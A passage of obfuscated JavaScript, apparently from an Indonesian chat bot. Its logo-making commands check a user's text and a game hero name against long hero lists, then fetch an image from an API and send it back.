_0x67c6e6=[_0x240d04(0x19d7),_0x1ce978['enoRi'],_0x240d04(0x2744),_0x1ce978[_0x240d04(0xacd)],_0x1ce978[_0x240d04(0xe96)],_0x1ce978['SfxqE'],_0x240d04(0x252f),_0x1ce978[_0x240d04(0x58c)],_0x1ce978[_0x240d04(0x338)],_0x1ce978[_0x240d04(0x1efa)],_0x240d04(0x171c),_0x1ce978[_0x240d04(0x108f)],_0x1ce978[_0x240d04(0x20ff)],_0x240d04(0x2d44),_0x240d04(0x21f3),_0x1ce978[_0x240d04(0x36d)],_0x240d04(0x23f5),_0x1ce978['KTAyj'],_0x1ce978[_0x240d04(0x135d)],_0x240d04(0xb04),_0x1ce978[_0x240d04(0xf09)],_0x1ce978[_0x240d04(0x2173)],_0x1ce978[_0x240d04(0x1e68)],_0x1ce978[_0x240d04(0x1a28)],_0x1ce978[_0x240d04(0x23b2)],_0x1ce978[_0x240d04(0x13d4)],_0x1ce978['UdeMF'],_0x1ce978['UjCQC'],_0x1ce978[_0x240d04(0x900)],_0x240d04(0x2933),'paine-2',_0x240d04(0x1dea),_0x1ce978[_0x240d04(0x226)],_0x1ce978[_0x240d04(0x13e7)],_0x1ce978[_0x240d04(0x9ee)],'lauriel-8','omen-5',_0x240d04(0x129f),_0x1ce978[_0x240d04(0x2852)],_0x1ce978[_0x240d04(0x149b)],_0x1ce978[_0x240d04(0xa00)],_0x1ce978['EcAXh'],_0x1ce978[_0x240d04(0x719)],_0x1ce978[_0x240d04(0x2223)],_0x1ce978[_0x240d04(0x1ee0)],_0x1ce978[_0x240d04(0x2938)],_0x1ce978[_0x240d04(0x262a)],_0x1ce978[_0x240d04(0xb32)],_0x240d04(0x1470),_0x240d04(0xea),_0x1ce978[_0x240d04(0x26be)],_0x1ce978[_0x240d04(0x2a95)],_0x1ce978[_0x240d04(0x7e9)],_0x1ce978[_0x240d04(0x12e4)],_0x1ce978['DJlPq'],'aleister-4',_0x1ce978[_0x240d04(0x18e2)],_0x1ce978[_0x240d04(0x1704)],_0x240d04(0xc9),_0x1ce978[_0x240d04(0xf3c)],_0x1ce978['RIGlb'],_0x1ce978[_0x240d04(0x292c)],_0x1ce978[_0x240d04(0x393)],_0x1ce978['mEuoy'],_0x1ce978[_0x240d04(0x2919)],_0x1ce978[_0x240d04(0x11a4)],_0x1ce978[_0x240d04(0x124b)],_0x1ce978[_0x240d04(0x2ad1)],_0x1ce978[_0x240d04(0x9ab)],_0x1ce978[_0x240d04(0x48c)],'ignis-4','lubu-8',_0x1ce978[_0x240d04(0x284c)],_0x1ce978[_0x240d04(0x103b)],_0x1ce978[_0x240d04(0xae3)],_0x240d04(0x2c40),_0x1ce978[_0x240d04(0xcde)],_0x1ce978['qyVKk'],_0x1ce978[_0x240d04(0x21f9)],_0x1ce978['qdePf'],_0x1ce978[_0x240d04(0x20a5)],_0x1ce978[_0x240d04(0xc1c)],_0x1ce978[_0x240d04(0x977)],_0x1ce978['UXxxU'],_0x1ce978[_0x240d04(0x229d)],_0x240d04(0x456),_0x1ce978[_0x240d04(0x2549)],'volkath',_0x1ce978[_0x240d04(0x26b1)],_0x1ce978[_0x240d04(0x2bcc)],_0x1ce978['oJohS'],_0x1ce978[_0x240d04(0x148e)],_0x1ce978[_0x240d04(0x6e2)],_0x1ce978[_0x240d04(0x4d0)],_0x240d04(0x456),_0x1ce978[_0x240d04(0x171a)],_0x1ce978[_0x240d04(0x124d)],_0x1ce978[_0x240d04(0x1f83)],'qi',_0x1ce978['HcuhY'],_0x1ce978['MPZxX'],_0x1ce978[_0x240d04(0x23c1)],_0x1ce978[_0x240d04(0x26af)],_0x1ce978[_0x240d04(0x40d)],_0x1ce978[_0x240d04(0x180b)],_0x1ce978[_0x240d04(0x19e7)],_0x1ce978[_0x240d04(0x2b9f)],_0x1ce978[_0x240d04(0x1c4c)],_0x1ce978[_0x240d04(0xa78)],'vilolet-10',_0x1ce978['FOcfF'],_0x1ce978['AZLAt'],_0x1ce978[_0x240d04(0xf7e)],_0x1ce978[_0x240d04(0x5d3)],_0x240d04(0x18ee),_0x240d04(0x2dff),_0x240d04(0x5ac),_0x1ce978[_0x240d04(0xef6)],_0x1ce978[_0x240d04(0x2738)],_0x1ce978[_0x240d04(0x1270)],_0x240d04(0xb59),_0x240d04(0x198b),_0x240d04(0x267b),_0x1ce978[_0x240d04(0x1e8b)],_0x1ce978[_0x240d04(0x850)],_0x1ce978[_0x240d04(0x2b0c)],_0x1ce978[_0x240d04(0x2c9c)],_0x1ce978[_0x240d04(0x5d3)],_0x1ce978[_0x240d04(0xaa3)],_0x240d04(0x2686),_0x1ce978[_0x240d04(0x219c)],_0x1ce978['MolbG'],_0x1ce978['EFgzr'],_0x1ce978['FWecD'],_0x240d04(0x20cf),_0x1ce978['bNqxN'],_0x1ce978[_0x240d04(0x261f)],_0x1ce978[_0x240d04(0x1ff3)],_0x1ce978[_0x240d04(0x3a6)],_0x1ce978[_0x240d04(0x28f1)],_0x1ce978['rEZOh'],_0x1ce978['nllgF'],_0x1ce978[_0x240d04(0x2600)],_0x1ce978['CBtnA'],_0x1ce978[_0x240d04(0x1ac8)],_0x1ce978[_0x240d04(0x2718)],_0x1ce978[_0x240d04(0x55d)],_0x1ce978[_0x240d04(0x29ab)],_0x1ce978['vcHBn'],_0x1ce978[_0x240d04(0x2493)],_0x1ce978[_0x240d04(0x385)],_0x240d04(0x4af),_0x240d04(0x98c),_0x240d04(0x232a),_0x240d04(0x1983),_0x1ce978[_0x240d04(0xa4f)],_0x240d04(0x21ef),_0x1ce978['cfaEi'],_0x1ce978[_0x240d04(0x2a92)],_0x240d04(0x647),_0x1ce978[_0x240d04(0x22c6)],_0x1ce978['NknLV'],_0x1ce978['SGRWL'],_0x1ce978[_0x240d04(0x827)],_0x1ce978[_0x240d04(0xd05)],_0x1ce978[_0x240d04(0x1327)],_0x1ce978[_0x240d04(0x2e1f)],_0x1ce978[_0x240d04(0x27c0)],_0x1ce978[_0x240d04(0x138a)],_0x1ce978[_0x240d04(0x27ef)],_0x1ce978[_0x240d04(0x2c75)],_0x1ce978[_0x240d04(0x147e)],_0x1ce978[_0x240d04(0x1cda)],_0x240d04(0xa82),_0x240d04(0x54e),_0x1ce978[_0x240d04(0x8f5)],_0x1ce978[_0x240d04(0x1479)],_0x1ce978[_0x240d04(0x1682)],'natalya-2',_0x1ce978[_0x240d04(0x1feb)],_0x240d04(0x27ce),_0x1ce978['EjwZy'],_0x1ce978[_0x240d04(0x1769)],_0x1ce978[_0x240d04(0x250b)],_0x1ce978[_0x240d04(0xda8)],'yorn-2',_0x1ce978[_0x240d04(0x508)],_0x240d04(0x26de),_0x1ce978[_0x240d04(0x1d45)],_0x1ce978['qxFHe'],_0x1ce978[_0x240d04(0xdda)],_0x1ce978[_0x240d04(0x1f4d)],_0x1ce978[_0x240d04(0x2a9d)],_0x1ce978[_0x240d04(0x42b)],_0x1ce978[_0x240d04(0x854)],_0x240d04(0x184f),_0x1ce978[_0x240d04(0x2d5)],_0x1ce978['ZAFWH'],_0x1ce978['PjaPE'],_0x1ce978[_0x240d04(0x26fb)],_0x1ce978[_0x240d04(0x2c25)],_0x1ce978['IWZdP'],'nina-2',_0x1ce978[_0x240d04(0x21a5)],_0x1ce978[_0x240d04(0x2a3a)],_0x1ce978[_0x240d04(0x139e)],_0x1ce978[_0x240d04(0x2880)],_0x1ce978[_0x240d04(0x73b)],_0x1ce978[_0x240d04(0x25e0)],_0x1ce978[_0x240d04(0x2039)],_0x1ce978[_0x240d04(0x2054)],_0x1ce978[_0x240d04(0x25db)],_0x240d04(0x2963),_0x1ce978[_0x240d04(0x13f)],_0x1ce978['sZYJE'],_0x1ce978[_0x240d04(0x1708)],_0x1ce978['RMyfD'],_0x1ce978[_0x240d04(0x1381)],_0x1ce978[_0x240d04(0x753)],_0x1ce978[_0x240d04(0x2b70)],_0x1ce978['RbTKk'],_0x1ce978['xEyXC'],_0x1ce978[_0x240d04(0x2500)],_0x1ce978['BpLXA'],_0x1ce978[_0x240d04(0x9e1)],_0x1ce978['qZdHO'],_0x240d04(0x17eb),'arduin-2',_0x1ce978[_0x240d04(0x25c5)],_0x1ce978[_0x240d04(0x2a81)],_0x1ce978[_0x240d04(0x71c)],_0x1ce978[_0x240d04(0x14ed)],_0x1ce978[_0x240d04(0x159b)],_0x1ce978[_0x240d04(0x566)],_0x1ce978[_0x240d04(0x1d03)],'azzenka-2',_0x1ce978[_0x240d04(0x511)],_0x1ce978[_0x240d04(0x1a61)],_0x1ce978[_0x240d04(0x99b)],_0x1ce978[_0x240d04(0xd7e)],_0x1ce978[_0x240d04(0x838)],_0x1ce978['hLRkp'],_0x1ce978['hcLgI'],_0x1ce978[_0x240d04(0x3d5)],_0x1ce978[_0x240d04(0x1fd6)],_0x1ce978[_0x240d04(0x2a49)],_0x1ce978[_0x240d04(0xc92)],_0x1ce978[_0x240d04(0x3aa)],_0x1ce978['WSmFz'],_0x1ce978['kIhUX'],_0x1ce978[_0x240d04(0x18b9)],_0x1ce978[_0x240d04(0x1c47)],_0x1ce978[_0x240d04(0x1161)],_0x1ce978[_0x240d04(0x872)],_0x1ce978['MpsOD'],_0x1ce978['AjlHJ'],_0x1ce978[_0x240d04(0xac2)],_0x1ce978[_0x240d04(0x23ce)],_0x1ce978[_0x240d04(0x1958)],_0x240d04(0x28e4),_0x1ce978[_0x240d04(0x20b5)],_0x1ce978['aPuRm'],_0x1ce978[_0x240d04(0x1151)],_0x1ce978['HKQIX'],_0x1ce978[_0x240d04(0x101e)],_0x1ce978[_0x240d04(0x27a6)],_0x1ce978['mstPY'],_0x240d04(0x23b3),_0x240d04(0x17f2),_0x1ce978[_0x240d04(0x8ec)],_0x1ce978[_0x240d04(0x17e7)],_0x1ce978[_0x240d04(0x1d1b)],_0x1ce978[_0x240d04(0xcca)],_0x1ce978[_0x240d04(0x145c)],_0x240d04(0xd16),_0x1ce978[_0x240d04(0x2c09)],_0x1ce978['lyqTS'],_0x1ce978['tnukc'],_0x1ce978[_0x240d04(0x16f6)],_0x1ce978[_0x240d04(0xdec)],_0x1ce978[_0x240d04(0x595)],'kilgroth-2',_0x1ce978['eLuoL'],_0x240d04(0x23e2),_0x1ce978[_0x240d04(0x1952)],_0x1ce978['tOZVK'],_0x1ce978['nWpDc'],_0x1ce978[_0x240d04(0x2099)],_0x1ce978[_0x240d04(0x4ba)],_0x1ce978[_0x240d04(0x27f)],_0x1ce978[_0x240d04(0x2254)],_0x1ce978['WDOAq'],_0x1ce978[_0x240d04(0x21b2)],_0x240d04(0x2aa5),_0x1ce978[_0x240d04(0x2ead)],_0x1ce978[_0x240d04(0x8bb)],_0x240d04(0x1f3e),_0x1ce978[_0x240d04(0x1061)],_0x1ce978[_0x240d04(0x565)],_0x1ce978['VyHiv'],_0x240d04(0x15b8),'aleister-3',_0x240d04(0xa09),_0x1ce978[_0x240d04(0x2844)],'taara-3',_0x1ce978[_0x240d04(0x9c4)],_0x1ce978[_0x240d04(0x2882)],_0x1ce978[_0x240d04(0x1812)],_0x1ce978[_0x240d04(0x1b3d)],_0x1ce978[_0x240d04(0x127d)],_0x1ce978['IJXJj'],_0x240d04(0x1976),_0x1ce978[_0x240d04(0x2421)],_0x1ce978[_0x240d04(0x12ce)],_0x1ce978[_0x240d04(0x2e53)],_0x1ce978[_0x240d04(0x1e95)],_0x1ce978[_0x240d04(0xa8a)],_0x1ce978[_0x240d04(0x1d01)],_0x1ce978[_0x240d04(0x2198)],_0x1ce978['vNHdw'],_0x1ce978[_0x240d04(0x3cc)],_0x1ce978['CNXuI'],_0x1ce978[_0x240d04(0xa2c)],_0x1ce978['nrPVr'],_0x240d04(0xc69),_0x240d04(0x19e0),_0x1ce978[_0x240d04(0x1988)],_0x1ce978['NujNQ'],_0x1ce978['uheWm'],_0x1ce978[_0x240d04(0x22dd)],_0x1ce978[_0x240d04(0x2b11)],_0x240d04(0xc34)+'6',_0x240d04(0x1699),_0x1ce978[_0x240d04(0x9bf)],_0x1ce978[_0x240d04(0x2099)],_0x1ce978[_0x240d04(0xf8a)],_0x240d04(0xebf),_0x1ce978['LvRpz'],_0x1ce978[_0x240d04(0xb4b)],_0x1ce978['gCdWI'],'wisp-2',_0x1ce978[_0x240d04(0x10a3)],_0x1ce978[_0x240d04(0x2dd)],_0x1ce978[_0x240d04(0x1aa8)],_0x1ce978[_0x240d04(0x1763)],_0x1ce978[_0x240d04(0x182b)],_0x1ce978['qYqnM'],_0x240d04(0x2e21),_0x1ce978[_0x240d04(0x2bc0)],_0x1ce978[_0x240d04(0x111d)],_0x240d04(0x1c42),_0x240d04(0x7a7),_0x1ce978['DgOUQ'],_0x1ce978[_0x240d04(0x20ac)],_0x1ce978[_0x240d04(0x24b8)],'roxie','wukong-4','baldum-2',_0x1ce978[_0x240d04(0x277f)],_0x1ce978[_0x240d04(0x16ff)],_0x1ce978[_0x240d04(0x20f9)],_0x240d04(0x2951),_0x1ce978[_0x240d04(0x108f)],_0x240d04(0x2edb),_0x1ce978[_0x240d04(0x1a49)],_0x1ce978[_0x240d04(0x259a)],_0x1ce978['brczs'],_0x1ce978[_0x240d04(0xcf9)],_0x1ce978[_0x240d04(0x1939)],_0x1ce978[_0x240d04(0x1ee5)],_0x1ce978[_0x240d04(0xafa)],_0x1ce978[_0x240d04(0x29a)],'xeniel-4',_0x1ce978[_0x240d04(0x1ee4)],_0x1ce978[_0x240d04(0xe1)],_0x240d04(0x1149),_0x1ce978['xThng'],_0x240d04(0x21b9),_0x240d04(0xdaf),_0x1ce978['JGerk'],_0x1ce978[_0x240d04(0xa53)],'richter-2',_0x1ce978[_0x240d04(0x22d7)],_0x1ce978[_0x240d04(0x24c6)],_0x1ce978[_0x240d04(0x2557)],_0x1ce978['EXMjH'],_0x1ce978[_0x240d04(0x81a)],_0x240d04(0x1943),_0x1ce978['KiRiR'],_0x1ce978[_0x240d04(0x277a)],_0x1ce978[_0x240d04(0x2b0b)],_0x1ce978[_0x240d04(0x2bf2)],_0x1ce978[_0x240d04(0x783)],_0x1ce978[_0x240d04(0x21c0)],_0x1ce978[_0x240d04(0xf9d)],_0x1ce978[_0x240d04(0xec3)],_0x1ce978[_0x240d04(0x2b9c)],_0x1ce978[_0x240d04(0x1f92)],_0x1ce978['otjsT'],_0x240d04(0x294a),_0x1ce978['NuEfB'],_0x240d04(0x1dcd)+'-2',_0x240d04(0x1dcd),_0x1ce978[_0x240d04(0x1b2d)],_0x1ce978[_0x240d04(0x2cb1)],_0x1ce978[_0x240d04(0x23d5)],_0x1ce978[_0x240d04(0x2041)],_0x240d04(0x1b75),_0x1ce978[_0x240d04(0x1e88)],_0x240d04(0x1dc5),'veres-2',_0x1ce978[_0x240d04(0x2cff)],_0x1ce978[_0x240d04(0x2ec)],_0x1ce978[_0x240d04(0x1237)],_0x1ce978[_0x240d04(0x103)],_0x1ce978[_0x240d04(0x3c5)],_0x1ce978['oVEhc'],_0x1ce978[_0x240d04(0xd60)],_0x1ce978[_0x240d04(0x11ce)],_0x1ce978[_0x240d04(0x572)],_0x1ce978[_0x240d04(0x88f)],_0x1ce978[_0x240d04(0xc94)],_0x1ce978[_0x240d04(0x21f5)],_0x1ce978['oTnXa'],_0x1ce978[_0x240d04(0x1690)],_0x240d04(0x2da9),_0x1ce978['onFrv'],_0x1ce978['MPZxX'],_0x240d04(0x2bea),_0x1ce978[_0x240d04(0x24a)],_0x1ce978[_0x240d04(0x1264)],_0x1ce978[_0x240d04(0x2ea)],_0x1ce978[_0x240d04(0x262f)],_0x1ce978[_0x240d04(0x2966)],'amily-4',_0x1ce978[_0x240d04(0x107c)],_0x1ce978[_0x240d04(0x19d0)],_0x1ce978[_0x240d04(0x26fe)],_0x1ce978[_0x240d04(0xaeb)],_0x1ce978[_0x240d04(0x27e3)],_0x1ce978['MUZez'],_0x1ce978[_0x240d04(0x270e)],_0x1ce978[_0x240d04(0xc71)],_0x1ce978[_0x240d04(0x22f)],_0x1ce978[_0x240d04(0x536)],_0x240d04(0x1633),_0x1ce978[_0x240d04(0x2376)],_0x1ce978[_0x240d04(0x20cb)],_0x1ce978[_0x240d04(0x1bbf)],_0x240d04(0xaf6),_0x1ce978[_0x240d04(0x1b39)],_0x1ce978[_0x240d04(0x9f1)],_0x1ce978[_0x240d04(0x13c6)],_0x1ce978['WQPAy'],_0x1ce978[_0x240d04(0x1ab4)]];if(!_0x67c6e6[_0x240d04(0x55c)](_0x83dd4c))_0x1ce978[_0x240d04(0x156)](_0x1ce978['dKmiN'],_0x1ce978[_0x240d04(0x1f77)])?_0x1ce978[_0x240d04(0x1ba)](_0x5b695e,_0x5c0e46,_0x59b1c5['length'],_0x1ce978[_0x240d04(0x1861)]):_0x555a99(_0x67c6e6,_0x67c6e6['length'],_0x1ce978['OjOeG']);else{_0x1ce978[_0x240d04(0x17d6)](_0x476bfb,lang[_0x240d04(0x172a)]);let _0xf38509=_0x1ce978[_0x240d04(0x19a2)](api,_0x1ce978[_0x240d04(0x44a)],_0x1ce978[_0x240d04(0x2832)](_0x1ce978['jrCNG'],_0x3e6565),{'text':_0x2b7b14,'hero':_0x83dd4c},_0x240d04(0x23aa)),_0x3541c2=await fetch(_0xf38509);if(!_0x3541c2['ok'])throw await _0x3541c2[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+'hoto']({'url':_0xf38509},{'caption':lang['ok']});}}}break;case _0x1ce978['MUHxU']:{if(_0x1ce978[_0x240d04(0x46c)]===_0x1ce978[_0x240d04(0x2786)])return _0x2fc2fa=_0x1ce978[_0x240d04(0x2db7)](_0x304f7f,_0x48cfaa),_0x1ce978['kmtUo'](typeof _0x454a82,_0x1ce978['sghYt'])&&!_0x42ec69(_0x3a642f);else{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x4ca)](_0x476bfb,'Kirim\x20peri'+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+('\x20teks|lett'+_0x240d04(0x156d)+'oh\x20penggun'+_0x240d04(0xbbe))+(_0x1ec495+_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0xd52)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978[_0x240d04(0x251a)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x374)](_0x1ec495,_0x3e6565)+(_0x240d04(0x107d)+_0x240d04(0x156d)+'oh\x20penggun'+_0x240d04(0xbbe))+_0x1ce978[_0x240d04(0x461)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+'nami`'));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c['split']('|')[0x0],_0x83dd4c=_0x58693c['split']('|')[0x1];const _0x5e2f28=[_0x1ce978[_0x240d04(0x53a)],_0x1ce978['nIzQD'],_0x1ce978[_0x240d04(0x11d7)],_0x1ce978[_0x240d04(0x2003)],_0x1ce978[_0x240d04(0x1590)],_0x1ce978[_0x240d04(0x763)],_0x1ce978[_0x240d04(0x2274)],_0x240d04(0x2bfb),_0x1ce978['EFzCh'],_0x240d04(0x408),_0x1ce978['vRLsm'],_0x1ce978[_0x240d04(0x1a40)],_0x1ce978[_0x240d04(0x24a4)],_0x1ce978[_0x240d04(0x1845)],_0x1ce978[_0x240d04(0x9d2)],'irelia',_0x240d04(0x7de),_0x1ce978[_0x240d04(0xf29)],_0x1ce978['rcrbH'],_0x240d04(0xd31),_0x1ce978[_0x240d04(0x1a06)],_0x240d04(0xaa5),_0x1ce978['Fvuoe'],_0x1ce978[_0x240d04(0xaf4)],_0x240d04(0x9a4),_0x1ce978['blgjd'],_0x1ce978['aSWnJ'],_0x1ce978[_0x240d04(0x41c)],_0x1ce978[_0x240d04(0xba3)],_0x1ce978[_0x240d04(0x23a0)],_0x1ce978[_0x240d04(0x19d4)],_0x1ce978[_0x240d04(0x1def)],_0x1ce978[_0x240d04(0x1a6d)],_0x1ce978['ZNXHv'],'kayn',_0x240d04(0x1b12),_0x1ce978['jzDYA'],'zed',_0x240d04(0x16fc),_0x240d04(0x11a5),_0x1ce978[_0x240d04(0x613)],_0x1ce978[_0x240d04(0x2269)],_0x1ce978[_0x240d04(0x1527)],_0x240d04(0xbbb),_0x1ce978[_0x240d04(0x1315)],_0x240d04(0xac8),_0x1ce978[_0x240d04(0x27c2)],_0x1ce978[_0x240d04(0x2dce)]];if(!_0x5e2f28['includes'](_0x83dd4c))_0x555a99(_0x5e2f28,_0x5e2f28[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x2c8c)]);else{if(_0x1ce978['fsGje'](_0x1ce978[_0x240d04(0x2d4d)],'yMMNk')){_0x1ce978[_0x240d04(0x2d7)](_0x476bfb,lang['wait']);let _0x2c9882=api(_0x1ce978[_0x240d04(0x44a)],_0x1ce978['jrCNG']+_0x3e6565,{'text':_0x2b7b14,'letters':_0x83dd4c},_0x1ce978['EEoOe']),_0x1d198c=await fetch(_0x2c9882);if(!_0x1d198c['ok'])throw await _0x1d198c['text']();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x2c9882},{'caption':lang['ok']});}else _0x11aa0a[_0x240d04(0x15e)](_0x1ce978['cYYTP'],_0x1f2f97),_0x1ce978['FitPT'](_0x500855,_0x240d04(0xdb4)+_0x240d04(0x2d6c)+_0x240d04(0x809)+_0x1f840c['message']);}}}break;case _0x1ce978[_0x240d04(0xf39)]:{if(!_0x33cfb1)return _0x476bfb(_0x240d04(0x2972)+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+('\x20teks|hero'+'`\x0a\x0aContoh\x20'+_0x240d04(0x2d50)+_0x240d04(0x23fb))+(_0x1ec495+_0x3e6565)+('\x20NdikzOne|'+_0x240d04(0x237)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978[_0x240d04(0x110c)](_0x476bfb,'Kirim\x20peri'+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+(_0x240d04(0xd93)+'`\x0a\x0aContoh\x20'+_0x240d04(0x2d50)+':\x0a`')+(_0x1ec495+_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x237)));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c['split']('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x2d33a1=[_0x1ce978[_0x240d04(0x93b)],_0x1ce978[_0x240d04(0x2368)],_0x1ce978[_0x240d04(0x13d0)],_0x1ce978['cdWNt'],_0x1ce978[_0x240d04(0x2a3)],_0x1ce978['cDspU'],'zsombra',_0x240d04(0x1f02),_0x1ce978['Vkkjx'],_0x1ce978[_0x240d04(0x18d5)],_0x1ce978[_0x240d04(0x2158)],_0x1ce978[_0x240d04(0xf5f)],_0x1ce978[_0x240d04(0x26c1)],_0x1ce978['sjChV'],_0x1ce978[_0x240d04(0x20c9)],_0x240d04(0x1383),_0x240d04(0x19fa),_0x240d04(0x2704),_0x1ce978[_0x240d04(0xdca)],_0x1ce978[_0x240d04(0x1189)],_0x1ce978[_0x240d04(0xad7)],_0x1ce978[_0x240d04(0x2af6)],_0x1ce978[_0x240d04(0x15ce)],_0x1ce978[_0x240d04(0x23d7)],_0x1ce978['LfNan'],'yzarya',_0x1ce978['uJCHL'],_0x240d04(0x8f9)+'r',_0x1ce978[_0x240d04(0x10f7)],_0x1ce978['tHxHw'],_0x1ce978[_0x240d04(0x13cd)],_0x1ce978[_0x240d04(0x2d61)],_0x1ce978['HJuZY'],_0x1ce978[_0x240d04(0x1218)],_0x240d04(0x1803),_0x1ce978['dvbcK'],_0x1ce978['RsYcu'],_0x1ce978['PDpOX'],_0x1ce978[_0x240d04(0x8cd)],_0x1ce978[_0x240d04(0x2a9c)],_0x1ce978[_0x240d04(0x2c68)],_0x240d04(0xe3d),_0x240d04(0x1d43),_0x240d04(0x2610),'ygenji','ydva',_0x1ce978[_0x240d04(0x114e)],_0x1ce978[_0x240d04(0x270c)],_0x240d04(0x77b),_0x1ce978['MrFTf'],_0x1ce978[_0x240d04(0xc58)],_0x1ce978[_0x240d04(0x671)],_0x240d04(0x122f),_0x1ce978[_0x240d04(0x134b)],_0x1ce978[_0x240d04(0xda2)],'xsombra',_0x1ce978[_0x240d04(0x1786)],_0x1ce978[_0x240d04(0x2acd)],_0x1ce978['Xuckp'],_0x1ce978[_0x240d04(0x2aae)],_0x1ce978['mnkFn'],_0x1ce978[_0x240d04(0x29ad)],_0x1ce978[_0x240d04(0xdc7)],_0x1ce978[_0x240d04(0x224)],_0x1ce978[_0x240d04(0x464)],_0x1ce978['Lsckh'],_0x240d04(0x2258),_0x1ce978[_0x240d04(0x12c8)],_0x1ce978['AgPQU'],_0x240d04(0x15f1),_0x1ce978[_0x240d04(0x1611)],_0x1ce978[_0x240d04(0x8d9)],'wzenyatta',_0x1ce978[_0x240d04(0x43b)],_0x1ce978['fDNIE'],_0x1ce978[_0x240d04(0x1364)],_0x240d04(0x1bbe),'wsombra',_0x1ce978[_0x240d04(0x232f)],_0x240d04(0xcef),_0x1ce978[_0x240d04(0xfe7)],_0x1ce978[_0x240d04(0x100d)],_0x1ce978[_0x240d04(0x2b74)],_0x1ce978['vExsB'],'wmercy',_0x1ce978['OAyBN'],_0x1ce978['NtDBy'],_0x1ce978[_0x240d04(0x287b)],'wjunkrat',_0x240d04(0x1987),'widowmaker',_0x240d04(0x229b),_0x1ce978['QvySz'],_0x1ce978[_0x240d04(0x19ef)],_0x1ce978[_0x240d04(0x24fa)],'wana','vzenyatta',_0x1ce978[_0x240d04(0x14f6)],_0x1ce978[_0x240d04(0x927)],_0x1ce978[_0x240d04(0x29c0)],_0x1ce978[_0x240d04(0x2666)],_0x1ce978['Bswqq'],_0x1ce978['tSdLs'],_0x1ce978[_0x240d04(0xa40)],_0x240d04(0xb6a),_0x1ce978[_0x240d04(0x2ca1)],_0x1ce978[_0x240d04(0x1533)],_0x1ce978['cIHms'],_0x1ce978[_0x240d04(0x197a)],_0x1ce978[_0x240d04(0x1296)],_0x1ce978[_0x240d04(0x213b)],_0x1ce978[_0x240d04(0x28bc)],_0x1ce978[_0x240d04(0x2a73)],_0x240d04(0xe9d),_0x1ce978[_0x240d04(0x2c1)],_0x1ce978[_0x240d04(0x2ba)],_0x1ce978[_0x240d04(0xd2d)],_0x240d04(0x142a),_0x1ce978[_0x240d04(0x2ae4)],_0x1ce978[_0x240d04(0xd7f)],_0x1ce978[_0x240d04(0x21f4)],_0x1ce978[_0x240d04(0x21a8)],_0x240d04(0x130),_0x1ce978[_0x240d04(0x20a8)],_0x240d04(0x13ad),_0x1ce978[_0x240d04(0x1e17)],_0x1ce978[_0x240d04(0x16e4)],_0x1ce978[_0x240d04(0x2059)],_0x1ce978[_0x240d04(0x1967)],_0x1ce978[_0x240d04(0x2540)],'ureinhardt',_0x1ce978[_0x240d04(0x10dd)],_0x1ce978[_0x240d04(0xc20)],_0x1ce978[_0x240d04(0x27d6)],_0x1ce978[_0x240d04(0x17b1)],_0x1ce978[_0x240d04(0x2d40)],_0x1ce978[_0x240d04(0x18b6)],_0x1ce978[_0x240d04(0x2057)],_0x1ce978[_0x240d04(0x205f)],_0x1ce978[_0x240d04(0x75a)],_0x240d04(0x13cf),_0x1ce978[_0x240d04(0x869)],_0x1ce978[_0x240d04(0xda3)],_0x1ce978['rVBCM'],_0x1ce978['jCZvB'],_0x1ce978[_0x240d04(0x4b2)],_0x1ce978['WrqZR'],_0x1ce978[_0x240d04(0xc4d)],_0x1ce978[_0x240d04(0x1224)],_0x240d04(0x28c3),_0x1ce978[_0x240d04(0x1907)],'troadhog',_0x1ce978['dprPy'],_0x1ce978['uYavM'],_0x1ce978[_0x240d04(0x2567)],_0x240d04(0x280f),_0x240d04(0x26ba),_0x1ce978[_0x240d04(0x14c)],_0x1ce978[_0x240d04(0x1aa)],_0x1ce978[_0x240d04(0x1d44)],'tmccree',_0x240d04(0x2be5),_0x240d04(0x23b1),_0x240d04(0x242e),_0x1ce978[_0x240d04(0x2459)],_0x1ce978[_0x240d04(0x2430)],_0x1ce978[_0x240d04(0x1e4)],_0x1ce978[_0x240d04(0x4fa)],_0x1ce978[_0x240d04(0x2c84)],_0x1ce978[_0x240d04(0x25b4)],_0x1ce978['dbPpv'],_0x1ce978[_0x240d04(0x1267)],'swidowmake'+'r',_0x1ce978[_0x240d04(0x2cf9)],_0x1ce978[_0x240d04(0xf95)],_0x1ce978[_0x240d04(0x298f)],_0x1ce978[_0x240d04(0x67f)],_0x1ce978[_0x240d04(0x1904)],_0x1ce978[_0x240d04(0x2008)],_0x1ce978[_0x240d04(0x9eb)],_0x1ce978[_0x240d04(0x120a)],_0x240d04(0x22f6),_0x1ce978['XJkBi'],_0x1ce978['pOufN'],_0x1ce978[_0x240d04(0x2b18)],_0x1ce978[_0x240d04(0x1cb9)],_0x240d04(0x2a2c),_0x240d04(0x996),_0x240d04(0x23c2),_0x1ce978[_0x240d04(0xb27)],_0x1ce978[_0x240d04(0x3db)],_0x1ce978[_0x240d04(0xd29)],_0x1ce978[_0x240d04(0x986)],'rzarya',_0x240d04(0x1c6c),_0x1ce978[_0x240d04(0x2177)],_0x1ce978[_0x240d04(0x21db)],_0x1ce978['HhQyG'],'rsymmetra',_0x1ce978[_0x240d04(0x17e1)],_0x1ce978['xppRr'],_0x1ce978[_0x240d04(0xb01)],_0x1ce978[_0x240d04(0x226c)],_0x240d04(0xfad),_0x1ce978[_0x240d04(0x191a)],_0x1ce978[_0x240d04(0x21e2)],_0x1ce978['ZKPCi'],_0x1ce978[_0x240d04(0xa36)],_0x1ce978[_0x240d04(0x1f66)],_0x1ce978[_0x240d04(0x2474)],_0x1ce978['c